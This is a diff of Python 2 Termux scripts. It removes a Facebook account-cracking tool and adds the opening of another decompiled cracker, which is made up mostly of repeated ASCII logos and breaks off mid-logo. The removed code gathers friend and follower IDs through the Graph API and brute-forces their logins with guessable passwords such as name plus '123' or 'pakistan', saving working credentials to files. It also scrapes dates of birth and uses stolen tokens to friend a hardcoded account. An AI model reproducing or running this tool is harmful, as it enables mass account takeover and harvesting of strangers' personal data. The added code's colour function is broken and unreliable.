@@ -1,885 +1,1012 @@
-#coding=utf-8
-#!/usr/bin/python2
-#Originally Written By Muhammad Hamza
-try:
-    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
-    from multiprocessing.pool import ThreadPool
-except ImportError:
-    os.system("pip2 install requests")
-    os.system("python2 hop.py")
-os.system("clear")
-"""
-try:
-    my = requests.get("https://muhammadhamza365.byethost7.com")
-except requests.exceptions.ConnectionError:
-    print("")
-    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
-    print("")
-    time.sleep(1)
-    raw_input(" Press enter to try again ")
-    os.system("python2 new.py")"""
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
-    os.system("apt update && apt install nodejs -y")
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
-    os.system("apt install ruby -y && gem install lolcat")
-from requests.exceptions import ConnectionError
-os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && npm install")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
-    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
-    os.system("xdg-open http://aorracer.com/3mkf")
-    time.sleep(10)
-elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
-    print("\033[1;32mPlease Select Chrome Browser To Continue\033[0;97m")
-    os.system("xdg-open http://aorracer.com/3mkf")
-    time.sleep(10)
-bd=random.randint(2e7, 3e7)
-sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
-reload(sys)
-sys.setdefaultencoding("utf-8")
-c = "\033[1;32m"
-c2 = "\033[0;97m"
-c3 = "\033[1;31m"
-#MyLogo
-def logo():
-    os.system('echo -e "\n\n db   db       .d88b.       d8888b.\n 88   88      .8P  Y8.      88   8D\n 88ooo88      88    88      88oodD\n 88~~~88      88    88      88~~~\n 88   88       8b  d8       88 \n YP   YP        Y88P        88\n\n-----------------------------------------------\n\n➣ Codded By : Muhammad Hamza\n➣ Facebook  : Muhammad Hamza\n➣ Github    : https://github.com/Hamzahash\n➣ Youtube   : H.O.P Programmer\n\n-----------------------------------------------" | lolcat')
-def method_menu():
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    \033[1;32mClone Method Menu\033[0;97m")
-    print("")
-    print("[1] B-api (Fast)")
-    print("[2] Localhost")
-    print("")
-    method_menu_select()
-def method_menu_select():
-    afza = raw_input(" Choose method >>> ")
-    if afza =="1":
-        b_menu()
-    elif afza =="2":
-        l_menu()
-    else:
-        print("")
-        print("\t    \033[1;31mSelect valid option \033[0;97m")
-        print("")
-        method_menu_select()
-def login():
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"FB Login Menu"+c2)
-    print("")
-    print("[1] Token login")
-    print("[2] ID/Pass login")
-    print("")
-    login_select()
-def login_select():
-    afza = raw_input(" Choose login method >>> ")
-    if afza =="1":
-        os.system("clear")
-        logo()
-        print("")
-        print("\t    \033[1;32mFB Token Login\033[0;97m")
-        print("")
-        token = raw_input(" Past token here : ")
-        token_s = open(".fb_token.txt","w")
-        token_s.write(token)
-        token_s.close()
-        try:
-            r = requests.get("https://graph.facebook.com/me?access_token="+token)
-            q = json.loads(r.text)
-            name = q["name"]
-            nm = name.rsplit(" ")[0]
-            print("")
-            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
-            time.sleep(3)
-            method_menu()
-        except (KeyError , IOError):
-            print("")
-            print("\t    \033[1;31mToken not valid\033[0;97m")
-            print("")
-            raw_input(" Press enter to try again ")
-            login()
-    elif afza =="2":
-        login_fb()
-    else:
-        print("")
-        print("\t    "+c+"Select valid method"+c2)
-        print("")
-        login_select()
-def login_fb():
-	os.system("clear")
-	logo()
-	print("")
-	print("\t    \033[1;32mFB ID/PASS Login\033[0;97m")
-	print("")
-	id = raw_input(" ID/Mail/Num : ")
-	id1=id.replace(' ','')
-	id2=id1.replace('(','')
-	uid=id2.replace(')','')
-	pwd = raw_input(" Password   : ")
-	print("")
-	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text
-	q = json.loads(data)
-	if "loc" in q:
-		hamza = open(".fb_token.txt","w")
-		hamza.write(q["loc"])
-		hamza.close()
-		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])
-		time.sleep(1)
-		print("\t    \033[1;32mLogged in successfully\033[0;97m")
-		time.sleep(1)
-		method_menu()
-	elif "www.facebook.com" in q["error"]:
-		print("\t    \033[1;31mUser must verify account before login\033[0;97m")
-		print("")
-		time.sleep(1)
-		raw_input(" Press enter to try again ")
-		login_fb()
-	else:
-		print("\t\033[1;31mID/Number/Password may be wrong\033[0;97m")
-		print("")
-		raw_input(" Press enter to try again ")
-		login_fb()
-def b_menu():
-    global token
-    os.system("clear")
-    logo()
-    try:
-        token = open(".fb_token.txt","r").read()
-    except (KeyError , IOError):
-        login()
-    try:
-        r = requests.get("https://graph.facebook.com/me?access_token="+token)
-        q = json.loads(r.text)
-        nm = q["name"]
-        nmf = nm.rsplit(" ")[0]
-        ok = nmf
-    except (KeyError , IOError):
-        print("")
-        print("\t    "+c+"ID has checkpoint"+c2)
-        print("")
-        os.system("rm -rf .fb_token.txt")
-        time.sleep(1)
-        login()
-    except requests.exceptions.ConnectionError:
-        logo()
-        print("")
-        print("\t    \033[1;31mTurn on mobile data OR wifi \033[0;97m")
-        print("")
-        time.sleep(1)
-        raw_input(" Press enter to try again \033[0;97m")
-        b_menu()
-    os.system("clear")
-    logo()
-    print("")
-    print("\t  "+c+"Logged In User"+ok+c2)
-    print("")
-    os.system('echo -e "-----------------------------------------------"| lolcat')
-    print("")
-    print("[1] Crack from public id")
-    print("[2] Crack from followers")
-    print("[3] View token")
-    print("[4] Find date of birth")
-    print("[5] Return method menu")
-    print("[6] Logout")
-    print("")
-    b_menu_select()
-def b_menu_select():
-	select = raw_input("\nChoose Option >>> ")
-	id=[]
-	oks=[]
-	cps=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Public ID Cloning " | lolcat')
-		print("")
-		idt = raw_input(" Put Id/user :  ")
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Gathering Information " | lolcat')
-		print("")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
-			q = json.loads(r.text)
-			os.system("clear")
-			logo()
-			print("")
-			os.system('echo -e "\t    Public ID Cloning " | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
-		except (KeyError , IOError):
-		    print("")
-		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
-		    print("")
-		    raw_input("\nPress enter to back ")
-		    b_menu()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Followers Cloning " | lolcat')
-		print("")
-		idt = raw_input(" Put Id/user : ")
-		os.system("clear")
-		logo()
-		print("")
-		os.system('echo -e "\t    Gathering Information " | lolcat')
-		print("")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-			q = json.loads(r.text)
-			os.system("clear")
-			logo()
-			print("")
-			os.system('echo -e "\t    Followers Cloning" | lolcat')
-			print("")
-			print(" Target user : "+q["name"])
-		except (KeyError , IOError):
-		    print("")
-		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
-		    print("")
-		    raw_input("\nPress enter to back ")
-		    b_menu()
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="3":
-		view_token()
-	elif select =="4":
-	    extract_dob()
-	elif select =="5":
-	    method_menu()
-	elif select =="6":
-	    logout()
-	else:
-	    print("")
-	    print("\t    "+c+"Select valid method"+c2)
-	    print("")
-	    b_menu_select()
-	print(" Total IDs : "+str(len(id)))
-	time.sleep(0.5)
-	print(" The process is running in background")
-	print("")
-	print 47*("-")
-	print('')
-	
-	
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
-		try:
-		    pass1=name+"123"
-		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		    d=json.loads(q)
-		    if 'www.facebook.com' in d['error_msg']:
-		        print("[Checkpoint] "+uid+" | "+pass1)
-		        cp=open("cp.txt","a")
-		        cp.write(uid+" | "+pass1+"\n")
-		        cp.close()
-		        cps.append(uid)
-		    else:
-		    	if "access_token" in d:
-		            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
-		            ok=open("ok.txt","a")
-		            ok.write(uid+" | "+pass1+"\n")
-		            ok.close()
-		            oks.append(uid)
-		        else:
-		            pass2=name+"1234"
-		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		            d=json.loads(q)
-		            if 'www.facebook.com' in d['error_msg']:
-		                print("[Checkpoint] "+uid+" | "+pass2)
-		                cp=open("cp.txt","a")
-		                cp.write(uid+" | "+pass2+"\n")
-		                cp.close()
-		                cps.append(uid)
-		            else:
-		                if 'access_token' in d:
-		                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
-		                    ok=open("ok.txt","a")
-		                    ok.write(uid+" | "+pass2+"\n")
-		                    ok.close()
-		                    oks.append(uid)
-		                else:
-		                    pass3=name+"12345"
-		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                    d=json.loads(q)
-		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("[Checkpoint] "+uid+" | "+pass3)
-		                        cp=open("cp.txt","a")
-		                        cp.write(uid+" | "+pass3+"\n")
-		                        cp.close()
-		                        cps.append(uid)
-		                    else:
-		                        if 'access_token' in d:
-		                            print(" \x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
-		                            ok=open("ok.txt","a")
-		                            ok.write(uid+" | "+pass3+"\n")
-		                            ok.close()
-		                            oks.append(uid)
-		                        else:
-		                            pass4=name+"786"
-		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                            d=json.loads(q)
-		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("[Checkpoint] "+uid+" | "+pass4)
-		                                cp=open("cp.txt","a")
-		                                cp.write(uid+" | "+pass4+"\n")
-		                                cp.close()
-		                                cps.append(uid)
-		                            else:
-		                                if 'access_token' in d:
-		                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
-		                                    ok=open("ok.txt","a")
-		                                    ok.write(uid+" | "+pass4+"\n")
-		                                    ok.close()
-		                                    oks.append(uid)
-		                                else:
-		                                    pass5="786786"
-		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                                    d=json.loads(q)
-		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("[Checkpoint] "+uid+" | "+pass5)
-		                                        cp=open("cp.txt","a")
-		                                        cp.write(uid+" | "+pass5+"\n")
-		                                        cp.close()
-		                                        cps.append(uid)
-		                                    else:
-		                                        if 'access_token' in d:
-		                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
-		                                            ok=open("ok.txt","a")
-		                                            ok.write(uid+" | "+pass5+"\n")
-		                                            ok.close()
-		                                            oks.append(uid)
-		                                        else:
-		                                            pass6="000786"
-		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                                            d=json.loads(q)
-		                                            if 'www.facebook.com' in d['error_msg']:
-		                                                print("[Checkpoint] "+uid+" | "+pass6)
-		                                                cp=open("cp.txt","a")
-		                                                cp.write(uid+" | "+pass6+"\n")
-		                                                cp.close()
-		                                                cps.append(uid)
-		                                            else:
-		                                                if 'access_token' in d:
-		                                                    print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
-		                                                    ok=open("ok.txt","a")
-		                                                    ok.write(uid+" | "+pass6+"\n")
-		                                                    ok.close()
-		                                                    oks.append(uid)
-		                                                else:
-		                                                    pass7="pakistan"
-		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
-		                                                    d=json.loads(q)
-		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("[Checkpoint] "+uid+" | "+pass7)
-		                                                        cp=open("cp.txt","a")
-		                                                        cp.write(uid+" | "+pass7+"\n")
-		                                                        cp.close()
-		                                                        cps.append(uid)
-		                                                    else:
-		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m[Successfull] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
-		                                                            ok=open("ok.txt","a")
-		                                                            ok.write(uid+" | "+pass7+"\n")
-		                                                            ok.close()
-		                                                            oks.append(uid)
-															
-		except:
-			pass
-		
-	p = ThreadPool(30)
-	p.map(main, id)
-	print (" ")
-	print (47*"-")
-	print ("")
-	print (" Process has completed")
-	print (" Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
-	print ("")
-	print (47*"-")
-	print ("")
-	raw_input(" Press enter to back ")
-	b_menu()
-def view_token():
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    \033[1;32mLogged In Token \033[0;97m")
-    print("")
-    print(" Token : " )
-    os.system("cat .fb_token.txt")
-    print("")
-    raw_input(" Press enter to main menu ")
-    b_menu()
-def logout():
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"Logout Menu"+c2)
-    print("")
-    raw_input(" Do you really want to logout ? ")
-    os.system("rm -rf .fb_token.txt")
-    method_menu()
-def extract_dob():
-    global token
-    try:
-        token = open(".fb_token.txt","r").read()
-    except (KeyError , IOError):
-        time.sleep(1)
-        login()
-    os.system("clear")
-    logo()
-    print("")
-    print("\t    "+c+"Extract DOB Of ID"+c2)
-    print("")
-    print("[1] Grab from friendlist")
-    print("[2] Grab from followers")
-    print("[3] Grab single id")
-    print("[4] Back")
-    print("")
-    dob_select()
-def dob_select():
-	select = raw_input("\n Choose Option >>> ")
-	id=[]
-	nms=[]
-	if select =="1":
-		os.system("clear")
-		logo()
-		print("")
-		print("\t    \033[1;32mGrab DOB From Friendlist\033[0;97m")
-		print("")
-		idt = raw_input(" Put Id/user : ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-			q = json.loads(r.text)
-			print(" Target Id : "+q["name"])
-		except KeyError:
-		    print("")
-		    print('\033[1;31mID Not Found'+c2)
-		    print("")
-		    raw_input("\nPress enter to back ")
-		    dob_select()
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="2":
-		os.system("clear")
-		logo()
-		print("")
-		print("\033[1;32m Grab DOB From Followers\033[0;97m")
-		print("")
-		idt = raw_input(" Put Id/user : ")
-		try:
-			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
-			q = json.loads(r.text)
-			print(" Target user : "+q["name"])
-		except KeyError:
-			print('\t    \033[1;31mID Not Found\033[0;97m')
-			raw_input("\nPress enter to back ")
-			dob_select()
-		#print('[✓] Looking For Accounts')
-		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
-		z = json.loads(r.text)
-		for i in z["data"]:
-			uid=i['id']
-			na=i['name']
-			nm=na.rsplit(" ")[0]
-			id.append(uid+'|'+nm)
-	elif select =="3":
-		dob()
-	elif select =="4":
-	    b_menu()
-	else:
-	    print("")
-	    print ("\t    \033[1;31mSelect valid option\033[0;97m")
-	    print("")
-	    dob_select()
-	print (" Total IDs : "+str(len(id)))
-	print(" The Process has started")
-	print(" Note : This is for testing only")
-	print("")
-	print 47*("-")
-	print('')
 
-	def main(arg):
-		user=arg
-		uid,name=user.split("|")
+# Python Auto Dis Parser 1.1.0
+# Author : HTR-TECH | TAHMID RAYAT
+# https://linktr.ee/tahmid.rayat
+# https://fb.me/tahmid.rayat.official
+# ------------------------------------------
+# Embedded File   : YousufDhoom/YousufDhoom.py
+# Python Bytecode : 2.7 (62211)
+# Decompiled at   : Mon Oct 12 11:01:37 2020
+# ------------------------------------------
+
+#!/usr/bin/python2
+#coding=utf-8
+#The Credit For This Code Goes To Muhammad Yousuf
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
+#Reserved2020
+
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+def keluar():
+	print "\x1b[1;91mExit"
+	os.sys.exit()
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.001)
+
+#### colours ####
+B='\033[1;96m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+R='\033[1;94m'
+
+#Dev: qaiser
+##### LOGO #####
+logo = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo2 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo3 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo4 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo5 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo6 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo7 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo8 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo11 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
